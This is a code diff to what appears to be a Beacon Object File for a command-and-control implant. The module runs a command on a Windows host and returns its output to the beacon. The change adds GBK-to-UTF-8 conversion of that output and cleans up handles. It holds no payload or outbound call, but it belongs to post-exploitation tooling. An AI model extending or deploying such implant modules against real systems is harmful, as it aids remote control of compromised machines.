@@ -32,6 +32,8 @@ DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(VOID);
 DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
 DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
 DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(VOID);
+DECLSPEC_IMPORT int WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCSTR, int, LPWSTR, int);
+DECLSPEC_IMPORT int WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL);
 DECLSPEC_IMPORT int __cdecl MSVCRT$_snprintf(char *, size_t, const char *, ...);
 
 #define BUF_SIZE 65536
@@ -123,7 +125,40 @@ void go(char *args, int alen) {
     KERNEL32$GetExitCodeProcess(pi.hProcess, &exitcode);
 
     if (total > 0) {
-        BeaconPrintf(CALLBACK_OUTPUT, "%s", buf);
+        /* cmd.exe writes in the console's OEM/ANSI codepage (GBK/CP936 on
+         * Chinese Windows). The loader captures bytes as-is and JSON-encodes
+         * them, so raw GBK would arrive as mojibake. Convert CP_ACP → UTF-16
+         * → UTF-8 here so the output is valid UTF-8 by the time it's captured.
+         * Fall back to the raw buffer if the conversion is a no-op/empty. */
+        int wlen = KERNEL32$MultiByteToWideChar(0 /*CP_ACP*/, 0, buf, (int)total, NULL, 0);
+        if (wlen > 0) {
+            wchar_t *wbuf = (wchar_t *) KERNEL32$HeapAlloc(heap, 0, (wlen + 1) * 2);
+            if (wbuf) {
+                KERNEL32$MultiByteToWideChar(0, 0, buf, (int)total, wbuf, wlen);
+                int ulen = KERNEL32$WideCharToMultiByte(65001 /*CP_UTF8*/, 0,
+                    wbuf, wlen, NULL, 0, NULL, NULL);
+                if (ulen > 0) {
+                    char *utf8 = (char *) KERNEL32$HeapAlloc(heap, 0, ulen + 1);
+                    if (utf8) {
+                        KERNEL32$WideCharToMultiByte(65001, 0, wbuf, wlen, utf8, ulen, NULL, NULL);
+                        utf8[ulen] = 0;
+                        /* BeaconOutput is binary-safe (explicit length); %s
+                         * would also work since UTF-8 text has no embedded NUL. */
+                        BeaconOutput(CALLBACK_OUTPUT, utf8, ulen);
+                        KERNEL32$HeapFree(heap, 0, utf8);
+                        KERNEL32$HeapFree(heap, 0, wbuf);
+                        KERNEL32$CloseHandle(hRead);
+                        KERNEL32$CloseHandle(pi.hProcess);
+                        KERNEL32$CloseHandle(pi.hThread);
+                        KERNEL32$HeapFree(heap, 0, buf);
+                        return;
+                    }
+                }
+                KERNEL32$HeapFree(heap, 0, wbuf);
+            }
+        }
+        /* Conversion failed — emit raw bytes as a best effort. */
+        BeaconOutput(CALLBACK_OUTPUT, buf, (int)total);
     } else {
         BeaconPrintf(CALLBACK_OUTPUT, "(no output, exit code %lu)", exitcode);
     }
